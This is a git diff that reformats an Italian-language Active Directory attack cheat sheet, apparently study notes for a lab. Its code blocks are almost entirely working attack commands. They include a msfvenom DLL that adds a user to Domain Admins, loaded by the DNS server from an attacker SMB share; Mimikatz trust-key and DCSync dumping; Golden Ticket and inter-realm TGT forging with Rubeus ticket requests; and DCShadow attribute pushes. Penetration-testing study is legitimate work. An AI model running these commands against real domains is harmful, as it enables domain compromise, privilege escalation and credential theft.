@@ -663,20 +663,27 @@ python.exe .\tgsrepcrack.py [passlist] [ticket.kirbi]
 ### E' possibile per i membri del gruppo DNSAdmins caricare DLL arbitrarie con i privilegi del dns.exe. In caso che DC serve come DNS si può fare escalation a Domain Admins. 
 ### E' importante riavviare il servizio DNS
 ```
-			- powershell -ep bypass
-			- net user claudione /domain
-			- Get-NetGroupMember -GroupName "DNSAdmins"
-			- msfvenom -p windows/x64/exec cmd='net group "domain admins" claudione /add /domain' -f dll > mimilib.dll (creazione DLL malevola)
-			
-			- dnscmd dcorp-dc /config /serverlevelplugindll \\172.16.50.100\dll\mimilib.dll  (possiamo chiedere al dcorp-dc vittima di caricare la nostra DLL malevola al prossimo avvio del servizio (o al riavvio dell'attaccante))
-			o
-			- $dnsettings = Get-DnsServerSetting -ComputerName dcorp dc -Verbose -All
-			- $dnsettings.ServerLevelPluginDll = "\\172.16.50.100\dll\mimilib.dll"
-			- Set-DnsServerSetting -InputObject $dnsettings -ComputerName dcorp-dc -Verbose
-			
-			- sc \\dcorp-dc stop dns
-			- sc \\dcorp-dc start dns
-			- net user claudione /domain
+powershell -ep bypass
+
+net user claudione /domain
+
+Get-NetGroupMember -GroupName "DNSAdmins"
+
+msfvenom -p windows/x64/exec cmd='net group "domain admins" claudione /add /domain' -f dll > mimilib.dll (creazione DLL malevola)
+
+dnscmd dcorp-dc /config /serverlevelplugindll \\172.16.50.100\dll\mimilib.dll  (possiamo chiedere al dcorp-dc vittima di caricare la nostra DLL malevola al prossimo avvio del servizio (o al riavvio dell'attaccante))
+o
+$dnsettings = Get-DnsServerSetting -ComputerName dcorp dc -Verbose -All
+
+$dnsettings.ServerLevelPluginDll = "\\172.16.50.100\dll\mimilib.dll"
+
+Set-DnsServerSetting -InputObject $dnsettings -ComputerName dcorp-dc -Verbose
+
+sc \\dcorp-dc stop dns
+
+sc \\dcorp-dc start dns
+
+net user claudione /domain
 ```
 
 ## Child to Parent
@@ -689,33 +696,45 @@ python.exe .\tgsrepcrack.py [passlist] [ticket.kirbi]
 ### Da un DC possiamo forgiare un TGT (Golden Ticket) per un Enterprise Admins. Passiamo da un Domain Admins ad un Enterprise Admins (riconosciuto perchè il suo SID finisce con 519. Possiede l'accesso amministrativo a tutti i domini in una foresta)
 
 ```
-			- powershell -ep bypass
-			- Get-ADTrust -Filter * (verifichiamo la relazione tra padre e figlio che sia bidirezionale)
-			- Import-Module Invoke-Mimikatz.ps1
-			- Get-DomainSID -Domain [dominio di Enterprise Admins]
-			
-			- Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName enterprise.dc (trust key)
-			o
-			- Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"' 
-			
-			- Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:[FQDN dominio corrente] /sid: [SID dominio corrente] /sids:[SID Domain Enterprise] /rc4:[HASH trust key] /service:krbtgt (target service nel dominio parente) /target: [FQDN dominio parente] /ticket:[PATH dove il ticket verrà salvato] (Inter-realm TGT viene forgiato)
-			
-			- Rubeus.exe asktgs  /ticket: percorso ticket  /servizio: tipo di servizio [cifs/mcorpdc.moneycorp.local]  /dc: controller di dominio [mcorp-dc.moneycorp.local]  /ptt (Ottengo TGS per il servizio CIFS del dominio target quindi quello di Enterprise Admins)
-			- klist (verifico di avere il ticket TGS)
-			- ls \\mcorpdc.moneycorp.local\C$
+powershell -ep bypass
+
+Get-ADTrust -Filter * (verifichiamo la relazione tra padre e figlio che sia bidirezionale)
+
+Import-Module Invoke-Mimikatz.ps1
+
+Get-DomainSID -Domain [dominio di Enterprise Admins]
+
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName enterprise.dc (trust key)
+o
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"' 
+
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:[FQDN dominio corrente] /sid: [SID dominio corrente] /sids:[SID Domain Enterprise] /rc4:[HASH trust key] /service:krbtgt (target service nel dominio parente) /target: [FQDN dominio parente] /ticket:[PATH dove il ticket verrà salvato] (Inter-realm TGT viene forgiato)
+
+Rubeus.exe asktgs  /ticket: percorso ticket  /servizio: tipo di servizio [cifs/mcorpdc.moneycorp.local]  /dc: controller di dominio [mcorp-dc.moneycorp.local]  /ptt (Ottengo TGS per il servizio CIFS del dominio target quindi quello di Enterprise Admins)
+
+klist (verifico di avere il ticket TGS)
+
+ls \\mcorpdc.moneycorp.local\C$
 ```
 
 ## Trust Flow with krbtgt hash
 
 ```
-			- powershell -ep bypass
-			- Get-ADTrust -Filter * (verifichiamo la relazione tra padre e figlio che sia bidirezionale)
-			- Import-Module Invoke-Mimikatz.ps1
-			- Get-DomainSID -Domain [dominio di Enterprise Admins]
-			- Invoke-Mimikatz -Command '"lsadump::trust /patch"' (get krbtgt)
-			- Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:[FQDN dominio corrente] /sid: [SID dominio corrente] /sids:[SID Domain Enterprise] /krbtgt:[HASH] /ticket:[PATH dove il ticket verrà salvato] (Inter-realm TGT viene forgiato)
-			- Invoke-Mimikatz -Command '"kerberos::ptt [path ticket.kirbi]
-			- ls \\mcorpdc.moneycorp.local\C$
+powershell -ep bypass
+
+Get-ADTrust -Filter * (verifichiamo la relazione tra padre e figlio che sia bidirezionale)
+
+Import-Module Invoke-Mimikatz.ps1
+
+Get-DomainSID -Domain [dominio di Enterprise Admins]
+
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' (get krbtgt)
+
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:[FQDN dominio corrente] /sid: [SID dominio corrente] /sids:[SID Domain Enterprise] /krbtgt:[HASH] /ticket:[PATH dove il ticket verrà salvato] (Inter-realm TGT viene forgiato)
+
+Invoke-Mimikatz -Command '"kerberos::ptt [path ticket.kirbi]
+
+ls \\mcorpdc.moneycorp.local\C$
 ```
 
 ## Trust Flow Across Forest
@@ -745,7 +764,9 @@ o
 ### Verrà modificato il computer pc-w10$
 
 ```
-		- PS c:\> ([adsisearcher]"(&(objectCategory=Computer)(name=pc-w10))").Findall().Properties (verrà cambiato una proprietà di questo oggetto di AD)
-		- lsadump::dcshadow /object:pc-w10$ /attribute:badpwdcount /value=9999 (Console SYSTEM)
-		- lsadump::dcshadow /push
+PS c:\> ([adsisearcher]"(&(objectCategory=Computer)(name=pc-w10))").Findall().Properties (verrà cambiato una proprietà di questo oggetto di AD)
+
+lsadump::dcshadow /object:pc-w10$ /attribute:badpwdcount /value=9999 (Console SYSTEM)
+
+lsadump::dcshadow /push
 ```
